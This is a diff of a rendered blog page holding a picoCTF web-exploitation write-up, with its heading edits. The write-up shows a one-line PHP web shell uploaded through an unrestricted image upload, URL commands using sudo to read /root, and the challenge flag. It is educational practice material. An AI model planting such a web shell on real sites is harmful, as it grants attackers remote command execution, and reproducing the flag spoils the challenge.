@@ -12,7 +12,7 @@ So, I tried another picoCTF challenge and this one was basically:
 👨‍💻 “A developer added profile picture uploads. What could possibly go wrong?”
 If you’ve ever touched PHP (I’m sorry) you already know the answer: literally everything.
 The challenge: Standard Pizzas 🍕
-Step 1: Upload Feature? More Like Upload Malware
+Upload Feature? More Like Upload Malware
 The site lets you upload an image and then proudly tells you where it lives:">
 <meta name="author" content="Deni Andrian Prayoga">
 <link rel="canonical" href="/posts/picoctf-writeup-482/">
@@ -72,7 +72,7 @@ The site lets you upload an image and then proudly tells you where it lives:">
 👨‍💻 “A developer added profile picture uploads. What could possibly go wrong?”
 If you’ve ever touched PHP (I’m sorry) you already know the answer: literally everything.
 The challenge: Standard Pizzas 🍕
-Step 1: Upload Feature? More Like Upload Malware The site lets you upload an image and then proudly tells you where it lives:">
+Upload Feature? More Like Upload Malware The site lets you upload an image and then proudly tells you where it lives:">
   <meta property="og:locale" content="en-us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -86,7 +86,7 @@ So, I tried another picoCTF challenge and this one was basically:
 👨‍💻 “A developer added profile picture uploads. What could possibly go wrong?”
 If you’ve ever touched PHP (I’m sorry) you already know the answer: literally everything.
 The challenge: Standard Pizzas 🍕
-Step 1: Upload Feature? More Like Upload Malware
+Upload Feature? More Like Upload Malware
 The site lets you upload an image and then proudly tells you where it lives:">
 
 
@@ -116,12 +116,12 @@ The site lets you upload an image and then proudly tells you where it lives:">
   "@type": "BlogPosting",
   "headline": "PicoCTF Writeup #482",
   "name": "PicoCTF Writeup #482",
-  "description": "Hacking Profile Pictures Like It’s 2005 (picoCTF Web Exploit Writeup) So, I tried another picoCTF challenge and this one was basically:\n👨‍💻 “A developer added profile picture uploads. What could possibly go wrong?”\nIf you’ve ever touched PHP (I’m sorry) you already know the answer: literally everything.\nThe challenge: Standard Pizzas 🍕\nStep 1: Upload Feature? More Like Upload Malware The site lets you upload an image and then proudly tells you where it lives:\n",
+  "description": "Hacking Profile Pictures Like It’s 2005 (picoCTF Web Exploit Writeup) So, I tried another picoCTF challenge and this one was basically:\n👨‍💻 “A developer added profile picture uploads. What could possibly go wrong?”\nIf you’ve ever touched PHP (I’m sorry) you already know the answer: literally everything.\nThe challenge: Standard Pizzas 🍕\nUpload Feature? More Like Upload Malware The site lets you upload an image and then proudly tells you where it lives:\n",
   "keywords": [
     "ctf"
   ],
-  "articleBody": "Hacking Profile Pictures Like It’s 2005 (picoCTF Web Exploit Writeup) So, I tried another picoCTF challenge and this one was basically:\n👨‍💻 “A developer added profile picture uploads. What could possibly go wrong?”\nIf you’ve ever touched PHP (I’m sorry) you already know the answer: literally everything.\nThe challenge: Standard Pizzas 🍕\nStep 1: Upload Feature? More Like Upload Malware The site lets you upload an image and then proudly tells you where it lives:\nThe file duck.jpeg has been uploaded Path: uploads/duck.jpeg As soon as I saw that, my brain went:\n👉 “Wait… you’re telling me I can upload any file and then run it directly?”\nThis is basically the cybersecurity equivalent of putting the house keys under the doormat.\nStep 2: Congratulations, You Played Yourself So I uploaded this masterpiece called script.php:\n\u003c?php $result = shell_exec(\"pwd\"); echo $result; ?\u003e Then I visited /uploads/script.php and the site politely told me:\n/var/www/html/uploads 💥 RCE achieved. PHP once again proving it’s not a bug, it’s a lifestyle.\nStep 3: PHP Webshell as a Service™ One command was cute, but I wanted full control. So I made a tiny upgrade:\n\u003c?php $command = $_GET[\"c\"]; echo shell_exec($command); ?\u003e Now I could just run commands directly in the URL:\n/uploads/script.php?c=ls At this point I felt like a 90s movie hacker typing “access mainframe” — except it actually worked.\nStep 4: Dear Root, I’m in Your Walls The challenge said the flag was hiding in /root. No problem. Let’s snoop:\n/uploads/script.php?c=sudo -l Server: “Yeah, you can sudo.” Me: “Say no more.”\n/uploads/script.php?c=sudo ls /root Output:\nflag.txt Time for the final payload:\n/uploads/script.php?c=sudo cat /root/flag.txt And there it was:\npicoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0} Step 5: PHP + Uploads = Chaos.exe What did we learn, kids?\nIf you let users upload arbitrary files and run them, you’ve basically created free hacker hosting. File extensions are lies. Never trust them. PHP with shell_exec is like giving a toddler a flamethrower. This challenge was basically an Any% speedrun exploit. Final Thoughts This challenge was a nostalgia trip — straight back to the early 2000s when every site was PHP, every upload folder was writable, and every script kiddie had an edgy handle like “xXhaxor69Xx”.\nSo yeah. Don’t let “profile pictures” execute shell commands. Unless you want hackers to order root access with their pizza. 🍕💻\nFlag: picoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0}\n",
-  "wordCount" : "385",
+  "articleBody": "Hacking Profile Pictures Like It’s 2005 (picoCTF Web Exploit Writeup) So, I tried another picoCTF challenge and this one was basically:\n👨‍💻 “A developer added profile picture uploads. What could possibly go wrong?”\nIf you’ve ever touched PHP (I’m sorry) you already know the answer: literally everything.\nThe challenge: Standard Pizzas 🍕\nUpload Feature? More Like Upload Malware The site lets you upload an image and then proudly tells you where it lives:\nThe file duck.jpeg has been uploaded Path: uploads/duck.jpeg As soon as I saw that, my brain went:\n👉 “Wait… you’re telling me I can upload any file and then run it directly?”\nThis is basically the cybersecurity equivalent of putting the house keys under the doormat.\nCongratulations, You Played Yourself So I uploaded this masterpiece called script.php:\n\u003c?php $result = shell_exec(\"pwd\"); echo $result; ?\u003e Then I visited /uploads/script.php and the site politely told me:\n/var/www/html/uploads 💥 RCE achieved. PHP once again proving it’s not a bug, it’s a lifestyle.\nPHP Webshell as a Service™ One command was cute, but I wanted full control. So I made a tiny upgrade:\n\u003c?php $command = $_GET[\"c\"]; echo shell_exec($command); ?\u003e Now I could just run commands directly in the URL:\n/uploads/script.php?c=ls At this point I felt like a 90s movie hacker typing “access mainframe” — except it actually worked.\nDear Root, I’m in Your Walls The challenge said the flag was hiding in /root. No problem. Let’s snoop:\n/uploads/script.php?c=sudo -l Server: “Yeah, you can sudo.” Me: “Say no more.”\n/uploads/script.php?c=sudo ls /root Output:\nflag.txt Time for the final payload:\n/uploads/script.php?c=sudo cat /root/flag.txt And there it was:\npicoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0} PHP + Uploads = Chaos.exe What did we learn, kids?\nIf you let users upload arbitrary files and run them, you’ve basically created free hacker hosting. File extensions are lies. Never trust them. PHP with shell_exec is like giving a toddler a flamethrower. This challenge was basically an Any% speedrun exploit. Final Thoughts This challenge was a nostalgia trip — straight back to the early 2000s when every site was PHP, every upload folder was writable, and every script kiddie had an edgy handle like “xXhaxor69Xx”.\nSo yeah. Don’t let “profile pictures” execute shell commands. Unless you want hackers to order root access with their pizza. 🍕💻\nFlag: picoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0}\n",
+  "wordCount" : "375",
   "inLanguage": "en",
   "datePublished": "2025-08-20T10:06:40+07:00",
   "dateModified": "2025-08-20T10:06:40+07:00",
@@ -216,7 +216,7 @@ The site lets you upload an image and then proudly tells you where it lives:">
     <h1 class="post-title entry-hint-parent">
       PicoCTF Writeup #482
     </h1>
-    <div class="post-meta"><span title='2025-08-20 10:06:40 +0700 WIB'>August 20, 2025</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Deni Andrian Prayoga&nbsp;|&nbsp;<a href="https://github.com/nullvm/nullvm.github.io-precompiled/tree/main/content/posts/picoctf-writeup-482.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>
+    <div class="post-meta"><span title='2025-08-20 10:06:40 +0700 +07'>August 20, 2025</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Deni Andrian Prayoga&nbsp;|&nbsp;<a href="https://github.com/nullvm/nullvm.github.io-precompiled/tree/main/content/posts/picoctf-writeup-482.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>
 
 </div>
   </header> 
@@ -225,14 +225,14 @@ The site lets you upload an image and then proudly tells you where it lives:">
 <p>👨‍💻 <em>“A developer added profile picture uploads. What could possibly go wrong?”</em></p>
 <p>If you’ve ever touched PHP (I’m sorry) you already know the answer: <strong>literally everything</strong>.</p>
 <p>The challenge: <a href="https://play.picoctf.org/practice/challenge/482">Standard Pizzas</a> 🍕</p>
-<h2 id="step-1-upload-feature-more-like-upload-malware">Step 1: Upload Feature? More Like Upload <em>Malware</em><a hidden class="anchor" aria-hidden="true" href="#step-1-upload-feature-more-like-upload-malware">#</a></h2>
+<h2 id="upload-feature-more-like-upload-malware">Upload Feature? More Like Upload <em>Malware</em><a hidden class="anchor" aria-hidden="true" href="#upload-feature-more-like-upload-malware">#</a></h2>
 <p>The site lets you upload an image and then proudly tells you where it lives:</p>
 <pre tabindex="0"><code>The file duck.jpeg has been uploaded 
 Path: uploads/duck.jpeg
 </code></pre><p>As soon as I saw that, my brain went:</p>
 <p>👉 “Wait… you’re telling me I can upload <strong>any file</strong> and then run it directly?”</p>
 <p>This is basically the cybersecurity equivalent of putting the house keys under the doormat.</p>
-<h2 id="step-2-congratulations-you-played-yourself">Step 2: Congratulations, You Played Yourself<a hidden class="anchor" aria-hidden="true" href="#step-2-congratulations-you-played-yourself">#</a></h2>
+<h2 id="congratulations-you-played-yourself">Congratulations, You Played Yourself<a hidden class="anchor" aria-hidden="true" href="#congratulations-you-played-yourself">#</a></h2>
 <p>So I uploaded this masterpiece called <code>script.php</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#e06c75">$result</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">shell_exec</span>(<span style="color:#98c379">&#34;pwd&#34;</span>);
@@ -241,7 +241,7 @@ Path: uploads/duck.jpeg
 </span></span></code></pre></div><p>Then I visited <code>/uploads/script.php</code> and the site politely told me:</p>
 <pre tabindex="0"><code>/var/www/html/uploads
 </code></pre><p>💥 RCE achieved. PHP once again proving it’s not a bug, it’s a lifestyle.</p>
-<h2 id="step-3-php-webshell-as-a-service">Step 3: PHP Webshell as a Service™<a hidden class="anchor" aria-hidden="true" href="#step-3-php-webshell-as-a-service">#</a></h2>
+<h2 id="php-webshell-as-a-service">PHP Webshell as a Service™<a hidden class="anchor" aria-hidden="true" href="#php-webshell-as-a-service">#</a></h2>
 <p>One command was cute, but I wanted <strong>full control</strong>.
 So I made a tiny upgrade:</p>
 <div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
@@ -251,7 +251,7 @@ So I made a tiny upgrade:</p>
 </span></span></code></pre></div><p>Now I could just run commands directly in the URL:</p>
 <pre tabindex="0"><code>/uploads/script.php?c=ls
 </code></pre><p>At this point I felt like a 90s movie hacker typing “access mainframe” — except it actually worked.</p>
-<h2 id="step-4-dear-root-im-in-your-walls">Step 4: Dear Root, I’m in Your Walls<a hidden class="anchor" aria-hidden="true" href="#step-4-dear-root-im-in-your-walls">#</a></h2>
+<h2 id="dear-root-im-in-your-walls">Dear Root, I’m in Your Walls<a hidden class="anchor" aria-hidden="true" href="#dear-root-im-in-your-walls">#</a></h2>
 <p>The challenge said the flag was hiding in <code>/root</code>.
 No problem. Let’s snoop:</p>
 <pre tabindex="0"><code>/uploads/script.php?c=sudo -l
@@ -264,7 +264,7 @@ Me: “Say no more.”</p>
 <pre tabindex="0"><code>/uploads/script.php?c=sudo cat /root/flag.txt
 </code></pre><p>And there it was:</p>
 <pre tabindex="0"><code>picoCTF{wh47_c4n_u_d0_wPHP_a4ca6ea0}
-</code></pre><h2 id="step-5-php--uploads--chaosexe">Step 5: PHP + Uploads = Chaos.exe<a hidden class="anchor" aria-hidden="true" href="#step-5-php--uploads--chaosexe">#</a></h2>
+</code></pre><h2 id="php--uploads--chaosexe">PHP + Uploads = Chaos.exe<a hidden class="anchor" aria-hidden="true" href="#php--uploads--chaosexe">#</a></h2>
 <p>What did we learn, kids?</p>
 <ul>
 <li>If you let users upload arbitrary files and run them, you’ve basically created <strong>free hacker hosting</strong>.</li>
